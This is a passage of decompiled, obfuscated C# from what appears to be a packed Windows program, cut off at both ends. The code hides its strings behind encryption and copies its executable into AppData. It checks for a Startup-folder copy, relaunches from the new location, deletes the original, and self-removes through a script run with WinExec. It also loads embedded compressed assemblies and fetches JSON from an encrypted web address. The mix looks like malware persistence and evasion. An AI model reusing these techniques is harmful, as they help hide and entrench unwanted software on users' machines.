			_0003_2002.m__0002._0002(_0002, text);
			if (_0003_2002.m__0002._0002() == (-688813342 ^ num ^ num2))
			{
				_0003_2002.m__0003._0003();
				_0003_2002.m__0003 = null;
				_0005 = null;
				_000E = null;
			}
		}
		return text;
	}

	private static void _0002(byte[] _0002, int _0003, byte[] _0005)
	{
		int num = 0;
		int num2 = 0;
		int num3 = 128;
		int num4 = _0005.Length;
		while (num < num4)
		{
			if ((num3 <<= 1) == 256)
			{
				num3 = 1;
				num2 = _0002[_0003++];
			}
			if ((num2 & num3) != 0)
			{
				int num5 = (_0002[_0003] >> 2) + 3;
				int num6 = ((_0002[_0003] << 8) | _0002[_0003 + 1]) & 0x3FF;
				_0003 += 2;
				int num7 = num - num6;
				if (num7 < 0)
				{
					break;
				}
				while (--num5 >= 0 && num < num4)
				{
					_0005[num++] = _0005[num7++];
				}
			}
			else
			{
				_0005[num++] = _0002[_0003++];
			}
		}
	}
}
internal static class _0005
{
	private sealed class _0002
	{
		public int _0002;

		internal void _0002(int _0002)
		{
			this._0002 += _0002;
		}
	}

	internal sealed class _0003 : global::_0006<int>, global::_0008, global::_0002_2000<int>, _000F, _000E
	{
		private int _0002;

		private int m__0003;

		private int _0005;

		private int _0008;

		public int _0006;

		private _0002 _000E;

		private int _000F;

		private int _0002_2000;

		private int _0003_2000;

		private global::_0002_2000<int> _0005_2000;

		[DebuggerHidden]
		public _0003(int _0002)
		{
			this._0002 = _0002;
			_0005 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private void _0003_200A_2005_2008_0002()
		{
			int num = _0002;
			if (num == -3 || num == 1)
			{
				try
				{
				}
				finally
				{
					_0003();
				}
			}
		}

		void _000F._000F_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0003_200A_2005_2008_0002();
		}

		private bool _000E_200A_2005_2008_0002()
		{
			try
			{
				switch (_0002)
				{
				default:
					return false;
				case 0:
				{
					_0002 = -1;
					_000E = new _0002();
					_000E._0002 = _0008;
					_0002_2000 = 0;
					_000F = 1;
					_0006<int> obj = _000E._0002;
					int num3 = _000F;
					_0006<int> obj2 = obj;
					int num4 = num3;
					_0005_2000 = ((global::_0006<int>)new _0005(-2)
					{
						_000F = num4,
						_0006 = obj2
					})._0008_200A_2005_2008_0002();
					_0002 = -3;
					break;
				}
				case 1:
				{
					_0002 = -3;
					int num = _000E._0002;
					_000E._0002 = num - 1;
					if (_000E._0002 == 0)
					{
						bool result = false;
						_0003();
						return result;
					}
					int num2 = _000F;
					_000F = (num2 + _0002_2000 + _000E._0002) ^ (1909445447 + _0003_2000);
					_0002_2000 = num2;
					break;
				}
				}
				if (((_000E)_0005_2000)._000E_200A_2005_2008_0002())
				{
					_0003_2000 = _0005_2000._000E_200A_2005_2008_0002();
					this.m__0003 = _000F;
					_0002 = 1;
					return true;
				}
				_0003();
				_0005_2000 = null;
				return false;
			}
			catch
			{
				//try-fault
				this._0003_200A_2005_2008_0002();
				throw;
			}
		}

		bool _000E._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._000E_200A_2005_2008_0002();
		}

		private void _0003()
		{
			_0002 = -1;
			if (_0005_2000 != null)
			{
				_0005_2000._000F_200A_2005_2008_0002();
			}
		}

		[DebuggerHidden]
		private int _0003_200A_2005_2008_0002()
		{
			return this.m__0003;
		}

		int global::_0002_2000<int>._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0003_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private void _0003_200A_2005_2008_0005()
		{
			throw new NotSupportedException();
		}

		void _000E._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0003_200A_2005_2008_0005();
		}

		[DebuggerHidden]
		private object _0003_200A_2005_2008_0002()
		{
			return this.m__0003;
		}

		object _000E._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0003_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private global::_0002_2000<int> _0003_200A_2005_2008_0002()
		{
			_0003 obj;
			if (_0002 == -2 && _0005 == Thread.CurrentThread.ManagedThreadId)
			{
				_0002 = 0;
				obj = this;
			}
			else
			{
				obj = new _0003(0);
			}
			obj._0008 = _0006;
			return obj;
		}

		global::_0002_2000<int> global::_0006<int>._0008_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0003_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private _000E _0003_200A_2005_2008_0002()
		{
			return this._0003_200A_2005_2008_0002();
		}

		_000E global::_0008._0008_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0003_200A_2005_2008_0002();
		}
	}

	internal sealed class _0005 : global::_0006<int>, global::_0008, global::_0002_2000<int>, _000F, _000E
	{
		private int _0002;

		private int _0003;

		private int m__0005;

		private _0006<int> _0008;

		public _0006<int> _0006;

		private int _000E;

		public int _000F;

		private int _0002_2000;

		[DebuggerHidden]
		public _0005(int _0002)
		{
			this._0002 = _0002;
			m__0005 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private void _0005_200A_2005_2008_0002()
		{
		}

		void _000F._000F_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0005_200A_2005_2008_0002();
		}

		private bool _000E_200A_2005_2008_0002()
		{
			int num = _0002;
			if (num != 0)
			{
				if (num != 1)
				{
					return false;
				}
				_0002 = -1;
				_0002_2000 += _0002_2000;
				if (_0002_2000 == 64)
				{
					_0008(_0002_2000 - 7);
					_0002_2000 = 5;
				}
			}
			else
			{
				_0002 = -1;
				_0002_2000 = 1;
				_0008(_000E - -1228678956);
			}
			_0003 = _0002_2000;
			_0002 = 1;
			return true;
		}

		bool _000E._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._000E_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private int _0005_200A_2005_2008_0002()
		{
			return _0003;
		}

		int global::_0002_2000<int>._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0005_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private void _0005_200A_2005_2008_0003()
		{
			throw new NotSupportedException();
		}

		void _000E._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0005_200A_2005_2008_0003();
		}

		[DebuggerHidden]
		private object _0005_200A_2005_2008_0002()
		{
			return _0003;
		}

		object _000E._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0005_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private global::_0002_2000<int> _0005_200A_2005_2008_0002()
		{
			_0005 obj;
			if (_0002 == -2 && m__0005 == Thread.CurrentThread.ManagedThreadId)
			{
				_0002 = 0;
				obj = this;
			}
			else
			{
				obj = new _0005(0);
			}
			obj._000E = _000F;
			obj._0008 = _0006;
			return obj;
		}

		global::_0002_2000<int> global::_0006<int>._0008_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0005_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private _000E _0005_200A_2005_2008_0002()
		{
			return this._0005_200A_2005_2008_0002();
		}

		_000E global::_0008._0008_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0005_200A_2005_2008_0002();
		}
	}

	private delegate void _0006<_0002>(_0002 _0002);

	internal sealed class _0008 : global::_0006<int>, global::_0008, global::_0002_2000<int>, _000F, _000E
	{
		private int _0002;

		private int m__0003;

		private int _0005;

		private int m__0008;

		public int _0006;

		private int _000E;

		private global::_0002_2000<int> _000F;

		[DebuggerHidden]
		public _0008(int _0002)
		{
			this._0002 = _0002;
			_0005 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private void _0008_200A_2005_2008_0002()
		{
			int num = _0002;
			if (num == -3 || num == 1)
			{
				try
				{
				}
				finally
				{
					_0003();
				}
			}
		}

		void _000F._000F_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0008_200A_2005_2008_0002();
		}

		private bool _000E_200A_2005_2008_0002()
		{
			try
			{
				switch (_0002)
				{
				default:
					return false;
				case 0:
				{
					_0002 = -1;
					_000E = 7;
					int num = m__0008;
					_000F = ((global::_0006<int>)new _0003(-2)
					{
						_0006 = num
					})._0008_200A_2005_2008_0002();
					_0002 = -3;
					break;
				}
				case 1:
					_0002 = -3;
					if (_000E == 0)
					{
						bool result = false;
						_0003();
						return result;
					}
					break;
				}
				if (((_000E)_000F)._000E_200A_2005_2008_0002())
				{
					int num2 = _000F._000E_200A_2005_2008_0002() ^ m__0008;
					if ((num2 & 3) == 0)
					{
						num2 ^= -299811599;
					}
					_000E--;
					if ((num2 & 0xF) == 0)
					{
						num2 ^= -628990873 ^ _000E;
					}
					this.m__0003 = num2;
					_0002 = 1;
					return true;
				}
				_0003();
				_000F = null;
				return false;
			}
			catch
			{
				//try-fault
				this._0008_200A_2005_2008_0002();
				throw;
			}
		}

		bool _000E._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._000E_200A_2005_2008_0002();
		}

		private void _0003()
		{
			_0002 = -1;
			if (_000F != null)
			{
				_000F._000F_200A_2005_2008_0002();
			}
		}

		[DebuggerHidden]
		private int _0008_200A_2005_2008_0002()
		{
			return this.m__0003;
		}

		int global::_0002_2000<int>._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0008_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private void _0008_200A_2005_2008_0005()
		{
			throw new NotSupportedException();
		}

		void _000E._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0008_200A_2005_2008_0005();
		}

		[DebuggerHidden]
		private object _0008_200A_2005_2008_0002()
		{
			return this.m__0003;
		}

		object _000E._000E_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0008_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private global::_0002_2000<int> _0008_200A_2005_2008_0002()
		{
			_0008 obj;
			if (_0002 == -2 && _0005 == Thread.CurrentThread.ManagedThreadId)
			{
				_0002 = 0;
				obj = this;
			}
			else
			{
				obj = new _0008(0);
			}
			obj.m__0008 = _0006;
			return obj;
		}

		global::_0002_2000<int> global::_0006<int>._0008_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0008_200A_2005_2008_0002();
		}

		[DebuggerHidden]
		private _000E _0008_200A_2005_2008_0002()
		{
			return this._0008_200A_2005_2008_0002();
		}

		_000E global::_0008._0008_200A_2005_2008_0002()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0008_200A_2005_2008_0002();
		}
	}
}
internal sealed class _0005_2000
{
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
	private struct _0002
	{
	}

	internal static readonly _0002 _0002/* Not supported: data(00 01 00 03 05 03 00 01 00 00 02 00 06 07 06 00) */;
}
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
[DebuggerNonUserCode]
internal sealed class _0005_2001
{
	private static ResourceManager m__0002;

	private static CultureInfo m__0003;

	internal _0005_2001()
	{
	}

	internal static ResourceManager _0002()
	{
		if (_0005_2001.m__0002 == null)
		{
			_0005_2001.m__0002 = new ResourceManager(_0003_2002._0002(-1022255278), typeof(_0005_2001).Assembly);
		}
		return _0005_2001.m__0002;
	}

	internal static CultureInfo _0002()
	{
		return _0005_2001.m__0003;
	}

	internal static void _0002(CultureInfo _0002)
	{
		_0005_2001.m__0003 = _0002;
	}

	internal static string _0002()
	{
		return _0005_2001._0002().GetString(_0003_2002._0002(-1022255255), _0005_2001.m__0003);
	}

	internal static Bitmap _0002()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		return (Bitmap)_0005_2001._0002().GetObject(_0003_2002._0002(-1022255241), _0005_2001.m__0003);
	}

	internal static string _0003()
	{
		return _0005_2001._0002().GetString(_0003_2002._0002(-1022255360), _0005_2001.m__0003);
	}

	internal static string _0005()
	{
		return _0005_2001._0002().GetString(_0003_2002._0002(-1022255339), _0005_2001.m__0003);
	}
}
internal static class _0005_2002
{
}
internal interface _0006<_0002> : _0008
{
	new global::_0002_2000<_0002> _0008_200A_2005_2008_0002();
}
internal static class _0006_2000
{
	internal enum _0002
	{

	}

	internal static _0002 _0002;

	internal static string _0003;

	internal static string _0005;

	internal static _000F_2001._0002 _0008;

	internal static string _0006;

	internal static string _000E;

	internal static string _000F;

	internal static string _0002_2000;

	internal static string _0003_2000;

	internal static string _0005_2000;

	internal static bool _0008_2000;

	internal static DateTime _0006_2000;

	internal static bool _000E_2000;

	internal static int _000F_2000;

	internal static string _0002_2001;

	internal static string _0003_2001;

	internal static int _0005_2001;

	static _0006_2000()
	{
		_000E_2000 = false;
		_000F_2000 = 6000;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		global::_0006_2000._0002 = (_0002)1;
		_0006_2000 = new DateTime(2016, 1, 1);
		_0003 = _0003_2002._0002(-1022257834) + Environment.NewLine + _0003_2002._0002(-1022257972);
		_0005 = _0003_2002._0002(-1022257946);
		_0008 = (_000F_2001._0002)1;
		_0006 = _0003_2002._0002(-1022258020);
		_000F = _0003_2002._0002(-1022258010);
		_0002_2000 = Path.Combine(folderPath, _000F);
		_000E = Path.Combine(folderPath2, _0006);
		_0003_2000 = _0003_2002._0002(-1022258103);
		_0005_2000 = Path.Combine(folderPath, _0003_2000);
		if (!Directory.Exists(_0005_2000))
		{
			Directory.CreateDirectory(_0005_2000);
		}
		_0008_2000 = true;
		_0002_2001 = _0003_2002._0002(-1022258083) + Environment.NewLine + _0003_2002._0002(-1022258137) + Environment.NewLine + _0003_2002._0002(-1022257163) + Environment.NewLine + _0003_2002._0002(-1022257338) + Environment.NewLine + _0003_2002._0002(-1022257378) + Environment.NewLine + Environment.NewLine + _0003_2002._0002(-1022257452) + Environment.NewLine + _0003_2002._0002(-1022257525) + Environment.NewLine + _0003_2002._0002(-1022257570) + Environment.NewLine + _0003_2002._0002(-1022257648) + Environment.NewLine + _0003_2002._0002(-1022258720) + Environment.NewLine + _0003_2002._0002(-1022258869) + Environment.NewLine + _0003_2002._0002(-1022258914) + Environment.NewLine + Environment.NewLine + _0003_2002._0002(-1022258974) + Environment.NewLine + _0003_2002._0002(-1022259024) + Environment.NewLine + Environment.NewLine + _0003_2002._0002(-1022259098);
		_0005_2001 = 5000;
		_0003_2001 = _0003_2002._0002(-1022258238) + _0005_2001 + _0003_2002._0002(-1022258196);
	}
}
internal static class _0006_2001
{
	private sealed class _0002
	{
		public string _0002;

		internal bool _0002(Process _0002)
		{
			return _0002.MainModule!.FileName!.StartsWith(this._0002);
		}
	}

	internal static void _0002(_0006_2000._0002 _0002, string _0003)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		if (_0002 == (_0006_2000._0002)0)
		{
			MessageBox.Show(_0005_2001._0003());
			return;
		}
		if (_0003 != null)
		{
			if (_0002 == (_0006_2000._0002)3)
			{
				_0003 = _0003.Replace('?', ' ');
				if (Path.IsPathRooted(_0003) && File.Exists(_0003))
				{
					int num = 0;
					bool flag;
					do
					{
						_0002 obj = new _0002();
						string? fileNameWithoutExtension = Path.GetFileNameWithoutExtension(_0003);
						obj._0002 = Directory.GetParent(_0003)!.ToString();
						flag = Process.GetProcessesByName(fileNameWithoutExtension).FirstOrDefault(obj._0002) != null;
						Thread.Sleep(100);
						num++;
					}
					while (flag && num < 100);
					Thread.Sleep(300);
					if (!flag)
					{
						File.Delete(_0003);
					}
				}
			}
			if (_0002 == (_0006_2000._0002)1)
			{
				MessageBox.Show(_0006_2000._0003, _0006_2000._0005, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			if (_0006_2000._0008_2000)
			{
				Environment.Exit(0);
			}
			return;
		}
		string text = _0006_2000._000E;
		if (_0006_2000._000F != null)
		{
			string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(_0006_2000._000F));
			_000F_2001._0002(_0006_2000._0008);
			if (Application.get_ExecutablePath() == _0006_2000._0002_2000 || Application.get_ExecutablePath() == text2)
			{
				return;
			}
		}
		if (_0006_2001._0002(_0006_2000._0002_2000, _0003: true))
		{
			_0006_2001._0002(text, _0003: true);
		}
		string arguments = Application.get_ExecutablePath().Replace(' ', '?');
		Process.Start(text, arguments);
		Environment.Exit(0);
	}

	internal static bool _0002(string _0002, bool _0003)
	{
		if (Application.get_ExecutablePath() == _0002)
		{
			return false;
		}
		Directory.CreateDirectory(Directory.GetParent(_0002)!.ToString());
		File.Copy(Application.get_ExecutablePath(), _0002, _0003);
		return true;
	}

	internal static bool _0002()
	{
		return DateTime.Now > _0006_2000._0006_2000;
	}

	internal static void _0002()
	{
		if (_0006_2000._0002 == (_0006_2000._0002)0)
		{
			Environment.Exit(0);
		}
		try
		{
			_000F_2001._0003(_0006_2000._0002_2000);
			foreach (string item in new HashSet<string>
			{
				Path.GetDirectoryName(_0006_2000._0002_2000),
				Path.GetDirectoryName(_0006_2000._000E),
				_0006_2000._0005_2000
			})
			{
				try
				{
					if (Directory.Exists(item))
					{
						Directory.Delete(item, recursive: true);
					}
				}
				catch (Exception)
				{
				}
			}
			string text = Path.GetDirectoryName(Application.get_ExecutablePath()) + _0003_2002._0002(-1022255535);
			StreamWriter streamWriter = new StreamWriter(text, append: false, Encoding.Default);
			try
			{
				streamWriter.Write(_0003_2002._0002(-1022255495), Application.get_ExecutablePath());
			}
			finally
			{
				((IDisposable)streamWriter).Dispose();
			}
			_0002(text, 0u);
		}
		catch
		{
		}
		finally
		{
			try
			{
				Environment.Exit(0);
			}
			catch
			{
				Application.Exit();
			}
		}
	}

	[DllImport("kernel32.dll", EntryPoint = "WinExec")]
	public static extern uint _0002(string _0002, uint _0003);
}
internal interface _0008
{
	_000E _0008_200A_2005_2008_0002();
}
internal static class _0008_2000
{
	private static readonly Dictionary<string, bool> m__0002 = new Dictionary<string, bool>();

	private static readonly Dictionary<string, string> _0003 = new Dictionary<string, string>();

	private static readonly Dictionary<string, string> _0005 = new Dictionary<string, string>();

	private static ResolveEventHandler _0008;

	static _0008_2000()
	{
		_0003.Add(_0003_2002._0002(-1022257779), _0003_2002._0002(-1022257769));
	}

	private static string _0002(CultureInfo _0002)
	{
		if (_0002 == null)
		{
			return string.Empty;
		}
		return _0002.Name;
	}

	private static Assembly _0002(AssemblyName _0002)
	{
		AppDomain currentDomain = AppDomain.CurrentDomain;
		Assembly[] assemblies = currentDomain.GetAssemblies();
		Assembly[] array = assemblies;
		foreach (Assembly assembly in array)
		{
			AssemblyName name = assembly.GetName();
			if (string.Equals(name.Name, _0002.Name, StringComparison.InvariantCultureIgnoreCase) && string.Equals(_0008_2000._0002(name.CultureInfo), _0008_2000._0002(_0002.CultureInfo), StringComparison.InvariantCultureIgnoreCase))
			{
				return assembly;
			}
		}
		return null;
	}

	private static void _0002(Stream _0002, Stream _0003)
	{
		byte[] array = new byte[81920];
		int count;
		while ((count = _0002.Read(array, 0, array.Length)) != 0)
		{
			_0003.Write(array, 0, count);
		}
	}

	private static Stream _0002(string _0002)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if (_0002.EndsWith(_0003_2002._0002(-1022257847)))
		{
			using (Stream stream = executingAssembly.GetManifestResourceStream(_0002))
			{
				DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
				try
				{
					MemoryStream memoryStream = new MemoryStream();
					_0008_2000._0002(deflateStream, memoryStream);
					memoryStream.Position = 0L;
					return memoryStream;
				}
				finally
				{
					((IDisposable)deflateStream).Dispose();
				}
			}
		}
		return executingAssembly.GetManifestResourceStream(_0002);
	}

	private static Stream _0002(Dictionary<string, string> _0002, string _0003)
	{
		if (_0002.TryGetValue(_0003, out var value))
		{
			return _0008_2000._0002(value);
		}
		return null;
	}

	private static byte[] _0002(Stream _0002)
	{
		byte[] array = new byte[_0002.Length];
		_0002.Read(array, 0, array.Length);
		return array;
	}

	private static Assembly _0002(Dictionary<string, string> _0002, Dictionary<string, string> _0003, AssemblyName _0005)
	{
		string text = _0005.Name!.ToLowerInvariant();
		if (_0005.CultureInfo != null && !string.IsNullOrEmpty(_0005.CultureInfo!.Name))
		{
			text = string.Format(_0003_2002._0002(-1022257852), _0005.CultureInfo!.Name, text);
		}
		byte[] rawAssembly;
		using (Stream stream = _0008_2000._0002(_0002, text))
		{
			if (stream == null)
			{
				return null;
			}
			rawAssembly = _0008_2000._0002(stream);
		}
		using (Stream stream2 = _0008_2000._0002(_0003, text))
		{
			if (stream2 != null)
			{
				byte[] rawSymbolStore = _0008_2000._0002(stream2);
				return Assembly.Load(rawAssembly, rawSymbolStore);
			}
		}
		return Assembly.Load(rawAssembly);
	}

	public static Assembly _0002(string _0002)
	{
		if (_0008_2000.m__0002.ContainsKey(_0002))
		{
			return null;
		}
		AssemblyName assemblyName = new AssemblyName(_0002);
		Assembly assembly = _0008_2000._0002(assemblyName);
		if ((object)assembly != null)
		{
			return assembly;
		}
		assembly = _0008_2000._0002(_0003, _0005, assemblyName);
		if ((object)assembly == null)
		{
			_0008_2000.m__0002.Add(_0002, value: true);
			if (assemblyName.Flags == AssemblyNameFlags.Retargetable)
			{
				assembly = Assembly.Load(assemblyName);
			}
		}
		return assembly;
	}

	private static Assembly _0002(object _0002, ResolveEventArgs _0003)
	{
		return _0008_2000._0002(_0003.Name);
	}

	public static void _0002()
	{
		AppDomain currentDomain = AppDomain.CurrentDomain;
		if (_0008 == null)
		{
			_0008 = _0002;
		}
		currentDomain.AssemblyResolve += _0008;
	}
}
internal static class _0008_2001
{
	private static string _0002()
	{
		return _0003_2002._0002(-1022255297);
	}

	internal static double _0002()
	{
		string address = _0008_2001._0002() + _0003_2002._0002(-1022255406);
		JObject val = JObject.Parse(new WebClient().DownloadString(address));
		JToken val2 = val.get_Item(_0003_2002._0002(-1022255389));
		if (val2 != null && ((object)val2).ToString() == _0003_2002._0002(-1022255364))
		{
			throw new Exception(((object)val).ToString());
		}
		return val.get_Item(_0003_2002._0002(-1022255480)).get_Item((object)_0003_2002._0002(-1022255481)).get_Item((object)_0003_2002._0002(-1022255471))
			.Value<double>((object)_0003_2002._0002(-1022255456));
	}

	internal static double _0002(string _0002)
	{
		string address = _0008_2001._0002() + _0003_2002._0002(-1022255428) + _0002;
		JObject val = JObject.Parse(new WebClient().DownloadString(address));
		JToken val2 = val.get_Item(_0003_2002._0002(-1022255389));
		if (val2 != null && ((object)val2).ToString() == _0003_2002._0002(-1022255364))
		{
			throw new Exception(((object)val).ToString());
		}
		return val.get_Item(_0003_2002._0002(-1022255480)).Value<double>((object)_0003_2002._0002(-1022255545));
	}
}
internal static class _0008_2002
{
	private sealed class _0003_2000_2006_200B_2000_2001_2001_2002_200B_2000_200A_2005_2002_2004_200B_200A
	{
		private int m__0002;

		private int _0003;

		internal _0003_2000_2006_200B_2000_2001_2001_2002_200B_2000_200A_2005_2002_2004_200B_200A()
		{
			_0002(0L);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal long _0002()
		{
			if ((object)Assembly.GetCallingAssembly() != typeof(_0003_2000_2006_200B_2000_2001_2001_2002_200B_2000_200A_2005_2002_2004_200B_200A).Assembly)
			{
				return 2918384L;
			}
			if (!_0008_2002._0002())
			{
				return 2918384L;
			}
			int[] array = new int[4];
			array[3] = ~(-(-(~(~(-(-(~(~(-(~1678314841))))))))));
			array[1] = -(~(-(~(~(-(-(~(~(-(~257500078))))))))));
			array[2] = ~(-(~(-(-(~(~(-(~-1134705716))))))));
			array[0] = ~(-(~(-(-(~(~(-(~2127117441))))))));
			int num = this.m__0002;
			int num2 = _0003;
			int num3 = ~(-(-(~(~(-(~(-(~1640531524))))))));
			int num4 = ~(-(~(-(-(~(~(-(~(-(~957401308))))))))));
			for (int i = 0; i != 32; i++)
			{
				num2 -= (((num << 4) ^ (num >> 5)) + num) ^ (num4 + array[(num4 >> 11) & 3]);
				num4 -= num3;
				num -= (((num2 << 4) ^ (num2 >> 5)) + num2) ^ (num4 + array[num4 & 3]);
			}
			for (int j = 0; j != 4; j++)
			{
				array[j] = 0;
			}
			ulong num5 = (ulong)((long)num2 << 32);
			return (long)(num5 | (uint)num);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal void _0002(long _0002)
		{
			if ((object)Assembly.GetCallingAssembly() == typeof(_0003_2000_2006_200B_2000_2001_2001_2002_200B_2000_200A_2005_2002_2004_200B_200A).Assembly && _0008_2002._0002())
			{
				int[] array = new int[4];
				array[1] = ~(-(-(~(~(-(-(~(~(-(~257500076))))))))));
				array[0] = ~(-(-(~(~(-(~(-(-(~(~2127117442))))))))));
				array[2] = ~(-(-(~(~(-(~(-(~-1134705716))))))));
				array[3] = -(~(~(-(-(~(~(-(-(~(~1678314843))))))))));
				int num = -(~(-(~(~(-(-(~(~1640531528))))))));
				int num2 = (int)_0002;
				int num3 = (int)(_0002 >> 32);
				int num4 = 0;
				for (int i = 0; i != 32; i++)
				{
					num2 += (((num3 << 4) ^ (num3 >> 5)) + num3) ^ (num4 + array[num4 & 3]);
					num4 += num;
					num3 += (((num2 << 4) ^ (num2 >> 5)) + num2) ^ (num4 + array[(num4 >> 11) & 3]);
				}
				for (int j = 0; j != 4; j++)
				{
					array[j] = 0;
				}
				this.m__0002 = num2;
				_0003 = num3;
			}
		}
	}

	private sealed class _0003_200B_2008_2008_2009_200A_2006_2009_200B_200A_200B
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0005(_000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0002(_0006_2001_2007_2004_2001_2007_2001_2004_2006_2001_200B._0002() ^ -(~(~(-(~(-(~(-(-(~(~-527758448)))))))))), _0008_2002._0002(typeof(_000F_2005_2009_2002_2009_2002_2003_2004_200B_2002_2000_2009_2001_2009_2002_200B))), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0003(_0008_2002._0002(typeof(_0005_2000_2003_2009_2004_2007_2009_200A_2002_2000_2001_2005_2006_2003_2007_2000_200B_2009_2001_2008_2000_200B_2002_2001)) ^ _0008_2002._0002(typeof(_0005_2002_2004_2007_2006_2007_2000_2007_2000_2007_2002_2007_200A_2002_2001_2008_2002)), -(~(~(-(-(~(~(-(-(~(~-191024224))))))))))));
		}
	}

	private sealed class _0005_2000_2003_2009_2004_2007_2009_200A_2002_2000_2001_2005_2006_2003_2007_2000_200B_2009_2001_2008_2000_200B_2002_2001
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0005(_000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0003(_0008_2002._0002(typeof(_0006_2001_2007_2004_2001_2007_2001_2004_2006_2001_200B)), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0005(_0008_2002._0002(typeof(_0005_2000_2003_2009_2004_2007_2009_200A_2002_2000_2001_2005_2006_2003_2007_2000_200B_2009_2001_2008_2000_200B_2002_2001)), _0008_2002._0002(typeof(_0005_2009_2007_2002_2006_2008_2002_200A_2003_2006_2004_2000_2009_2003_2002)))), _0005_2002_2004_2007_2006_2007_2000_2007_2000_2007_2002_2007_200A_2002_2001_2008_2002._0002());
		}
	}

	private sealed class _0005_2002_2004_2007_2006_2007_2000_2007_2000_2007_2002_2007_200A_2002_2001_2008_2002
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0002(_0008_2002._0002(typeof(_0005_2002_2004_2007_2006_2007_2000_2007_2000_2007_2002_2007_200A_2002_2001_2008_2002)), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0005(_000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0003(_0008_2002._0002(typeof(_0005_2009_2007_2002_2006_2008_2002_200A_2003_2006_2004_2000_2009_2003_2002)), _0008_2002._0002(typeof(_0005_2000_2003_2009_2004_2007_2009_200A_2002_2000_2001_2005_2006_2003_2007_2000_200B_2009_2001_2008_2000_200B_2002_2001))), _000F_2003_2003_200B_200B_2006_2004_2002_200B_200A_2007_2008_2000_2003_2000_2007_2009_2005_200B_200B_200B_2005_2007._0005(_0008_2002._0002(typeof(_0003_200B_2008_2008_2009_200A_2006_2009_200B_200A_200B)) ^ 